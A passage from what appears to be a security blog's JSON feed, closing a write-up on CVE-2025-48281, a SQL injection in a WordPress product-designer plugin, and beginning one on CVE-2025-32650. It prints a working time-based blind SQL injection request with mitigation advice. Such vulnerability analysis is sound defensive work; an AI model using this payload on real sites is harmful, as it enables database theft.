998 9.997-26.207 9.997-36.204-.001z\"/\u003e\u003c/svg\u003e\u003c/span\u003e\n      \u003c/button\u003e\n        \n      \u003cbutton \n        class=\"\n          tw-select-none \n          tw-mx-2 \n          tw-block \n          group-[.is-open]:tw-hidden \n          print:!tw-hidden\" \n        disabled\n        aria-hidden=\"true\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M328 256c0 39.8-32.2 72-72 72s-72-32.2-72-72 32.2-72 72-72 72 32.2 72 72zm104-72c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72zm-352 0c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72z\"/\u003e\u003c/svg\u003e\u003c/button\u003e\n    \u003c/div\u003e\n  \u003c/div\u003e\n  \u003cpre style=\"counter-reset: codeblock;\" class=\"tw-block tw-m-0 tw-p-0\"\u003e\u003ccode \n    id=\"codeblock-id-55\" \n    class=\"\n      chroma \n      !tw-block \n      tw-p-0\n      tw-m-0\n      tw-transition-[max-height] \n      tw-duration-500 \n      tw-ease-in-out \n      group-[.is-closed]:!tw-max-h-0 \n      group-[.is-wrap]:tw-text-wrap\n      tw-overflow-y-hidden\n      tw-overflow-x-auto\n      tw-scrollbar-thin\n      \"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1)\u003c/span\u003e \u003cspan class=\"kr\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eHost\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"l\"\u003elocalhost\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"g\"\u003eCookie: cookie_here\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/div\u003e\n\u003cp\u003eThis uses \u003ccode\u003eSUBSTRING()\u003c/code\u003e to get the first character of the \u003cstrong\u003edatabase name\u003c/strong\u003e, and \u003ccode\u003eIF()\u003c/code\u003e returns \u003ccode\u003eSLEEP(5)\u003c/code\u003e if that character equals \u003ccode\u003e0x77\u003c/code\u003e (\u0026lsquo;w\u0026rsquo;).\u003c/p\u003e\n\u003cp\u003eHex encoding \u003ccode\u003ew\u003c/code\u003e as \u003ccode\u003e0x77\u003c/code\u003e is used because \u003ccode\u003eorderby\u003c/code\u003e comes from a \u003cstrong\u003eGET\u003c/strong\u003e parameter that may be escaped by WordPress magic quotes.\u003c/p\u003e\n\u003cp\u003e👉 Based on the response time =\u0026gt; the first character is \u003ccode\u003ew\u003c/code\u003e.\u003c/p\u003e\n\u003ch2 id=\"conclusion\" class=\"headerLink\"\u003e\n    \u003ca href=\"#conclusion\" class=\"header-mark\"\u003e\u003c/a\u003e24 Conclusion\u003c/h2\u003e\u003cp\u003eThe \u003cstrong\u003eCVE-2025-48281\u003c/strong\u003e vulnerability in the WordPress \u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e plugin prior to version \u003cstrong\u003e3.21.2\u003c/strong\u003e stems from directly inserting user-controlled input into SQL without sufficient validation, leading to SQL Injection.\u003c/p\u003e\n\u003cp\u003eThe official patch implements a whitelist which ensures the input is validated and safer.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eKey takeaways\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eStrictly validate user input.\u003c/li\u003e\n\u003cli\u003eAlways use \u003ccode\u003e$wpdb-\u0026gt;prepare()\u003c/code\u003e when working with the database in WordPress to avoid SQL Injection.\u003c/li\u003e\n\u003cli\u003eRegularly update plugins and perform security checks to avoid becoming a target.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"references\" class=\"headerLink\"\u003e\n    \u003ca href=\"#references\" class=\"header-mark\"\u003e\u003c/a\u003e25 References\u003c/h2\u003e\u003cp\u003e\u003ca href=\"https://portswigger.net/web-security/sql-injection/cheat-sheet\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eSQL Injection cheat sheet - PortSwigger\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://patchstack.com/database/wordpress/plugin/mystyle-custom-product-designer/vulnerability/wordpress-mystyle-custom-product-designer-3-21-1-sql-injection-vulnerability\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eWordPress MyStyle Custom Product Designer Plugin \u0026lt;= 3.21.1 is vulnerable to SQL Injection\u003c/a\u003e\u003c/p\u003e",
        "language": "en"
    },
    {
        "title" : "CVE-2025-32650 Analysis \u0026 POC",
        "date_published" : "2025-09-26T10:36:00+07:00",
        "date_modified" : "2025-09-26T10:36:00+07:00",
        "id" : "http://localhost:1313/2025-09-26-cve-2025-32650/",
        "url" : "http://localhost:1313/2025-09-26-cve-2025-32650/",
        "content_html" : "\u003cp\u003eThe vulnerability occurs in the \u003cstrong\u003eAccessibility Suite\u003c/strong\u003e plugin for WordPress before version \u003cstrong\u003e4.19\u003c/strong\u003e.\nThis allows an attacker to directly interact with the database, potentially stealing sensitive information.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-32650\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eCVE-2025-32650\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/online-accessibility/\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eWordPress Accessibility Suite Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 4.18\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS Severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\" class=\"headerLink\"\u003e\n    \u003ca href=\"#requirements\" class=\"header-mark\"\u003e\u003c/a\u003e26 Requirements\u003c/h2\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/2025-08-21-wordpress-local-and-debugging/\" target=\"_blank\" rel=\"noopener noreferrer\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAccessibility Suite\u003c/strong\u003e:  v4.18 (vulnerable) and v4.19 (patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDiff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any other comparison tool to spot version differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\" class=\"headerLink\"\u003e\n    \u003ca href=\"#analysis\" class=\"header-mark\"\u003e\u003c/a\u003e27 Analysis\u003c/h2\u003e\u003cp\u003eThe plugin failed to properly typecast user input. Although it used \u003ccode\u003eprepare()\u003c/code\u003e to prevent SQLi, the implementation was \u003cstrong\u003eincorrect\u003c/strong\u003e, leaving the vulnerability exploitable.\u003c/p\u003e\n\u003ch3 id=\"patch-diff\" class=\"headerLink\"\u003e\n    \u003ca href=\"#patch-diff\" class=\"header-mark\"\u003e\u003c/a\u003e27.1 Patch Diff\u003c/h3\u003e\u003cp\u003eUse any diff tool to compare the vulnerable and patched versions.\nA key difference appears in \u003cstrong\u003eincludes/classes/Helper.php\u003c/strong\u003e.\u003c/p\u003e\n\u003cdiv class=\"code-block highlight is-open show-line-numbers  tw-group tw-my-2\"\u003e\n  \u003cdiv class=\"\n    \n    tw-flex \n    tw-flex-row\n    tw-flex-1 \n    tw-justify-between \n    tw-w-full tw-bg-bgColor-secondary\n    \"\u003e      \n    \u003cbutton \n      class=\"\n        code-block-button\n        tw-mx-2 \n        tw-flex\n        tw-flex-row\n        tw-flex-1\"\n      aria-hidden=\"true\"\u003e\n          \u003cdiv class=\"group-[.is-open]:tw-rotate-90 tw-transition-[transform] tw-duration-500 tw-ease-in-out print:!tw-hidden tw-w-min tw-h-min tw-my-1 tw-mx-1\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 320 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z\"/\u003e\u003c/svg\u003e\u003c/div\u003e\n          \u003cp class=\"tw-select-